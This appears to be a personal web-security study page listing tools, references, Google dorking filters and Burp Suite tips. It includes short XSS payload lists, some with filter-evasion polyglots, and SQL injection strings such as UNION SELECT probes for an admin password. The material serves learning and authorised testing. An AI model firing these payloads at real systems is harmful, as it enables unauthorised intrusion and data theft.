# Security

## Tools

[Base64 Decode and Encode](https://www.base64decode.org/)    
[Wappalyze](https://www.wappalyzer.com/) - Find out the technology stack of a website.  
[SecLists](https://github.com/danielmiessler/SecLists) - A collection of lists used during security assessments.     
[Sublist3r](https://github.com/aboul3la/Sublist3r) - Collects and gathers subdomains for a target domain.    
[fuff](https://github.com/ffuf/ffuf) - Web fuzzer.    
[Wfuzz](https://github.com/xmendez/wfuzz) - Web fuzzer.    
[XSS Hunter](https://github.com/mandatoryprogrammer/xsshunter) - Performs Blind XSS attacks and captures cookies, URLs, page contents.   
[XSStrike](https://github.com/s0md3v/XSStrike) - A Cross Site Scripting detection suite.         

## Reading

[OWASP Top 10](https://owasp.org/Top10/)     
[OWASP Web Security Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)      
[Postgres SQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet)    
[Bug Bounty Cheatsheet](https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html)     
[Command Injection Payload List](https://github.com/payloadbox/command-injection-payload-list)     

## Videos

[A Starters Guide to Pentesting with OWASP](https://www.youtube.com/watch?v=AO_sqXb-gKE)     

## Frameworks

A set of guidelines and best practices to help organizations build and improve their cybersecurity. Frameworks are a blueprint for managing risk and reducing vulnerabilities.

[OWASP](https://owasp.org/)    
[NCSC CAF](https://www.ncsc.gov.uk/collection/caf/caf-principles-and-guidance)    
[NIST](https://www.nist.gov/cyberframework)    

## Notes

### Google Hacking

[Google Hacking](https://en.wikipedia.org/wiki/Google_hacking) is a technique that uses Google Search and other Google applications to find security holes.

| Filter  | Example | 
| ------------- | ------------- | 
| site  | site:example.com  | 
| filetype  | filetype:csv  | 
| inurl  | inurl:admin  | 
| intitle  | intitle:admin  | 

**Example:** "-site:www.example.com site:*.example.com" would only contain results leading to the domain name example.com but exclude any links to www.example.com.

### Cross-site Scripting (XSS)

[OWASP XSS Overview](https://owasp.org/www-community/attacks/xss/)      
[THM XSS Room](https://tryhackme.com/room/xssgi)

```
<script>alert('XSS');</script>    
"><script>alert('XSS');</script>    
</textarea><script>alert('XSS');</script>    
';alert('XSS');//    
<sscriptcript>alert('XSS');</sscriptcript>    
/images/cat.jpg" onload="alert('XSS');    
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e    
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('XSS')//>\x3e    
<iframe src=\"javascript:alert(XSS)\">    
<iframe src="javascript:alert(`XSS`)">    
```

### SQL Injection

[OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)     
[W3Schools SQL Injection](https://www.w3schools.com/sql/sql_injection.asp)      
[THM SQL Injection](https://tryhackme.com/room/sqlinjectionlm)      
[OWASP Testing_PostgreSQL](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL)

- Inband: data is extracted using the same channel that is used to inject the SQL code. This is the most straightforward kind of attack, in which the retrieved data is presented directly in the application web page.
- Out-of-band: data is retrieved using a different channel (e.g., an email with the results of the query is generated and sent to the tester).
- Inferential or Blind: there is no actual transfer of data, but the tester is able to reconstruct the information by sending particular requests and observing the resulting behavior of the DB Server.

```
;
'
' OR 1=1;--
1 UNION SELECT 1,2
%00' UNION SELECT password FROM Users WHERE username='admin'--
%27%20UNION%20SELECT%20password%20FROM%20Users%20WHERE%20name%3D%27admin%27--
UNION ALL SELECT user,NULL,NULL--
```

## Burp Suite

[THM Burp Suite Basics](https://tryhackme.com/room/burpsuitebasics)         
[FoxyProxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-basic/)

Set up browser proxy and certificate. Turn intercept on and in proxy options configure rules - "Or Request Was Intercepted", "And URL Is in target scope". Send to repeater or send to intruder.

- Browser hanging - Turn off Intercept.      
- Can't intercept - Update Scope.

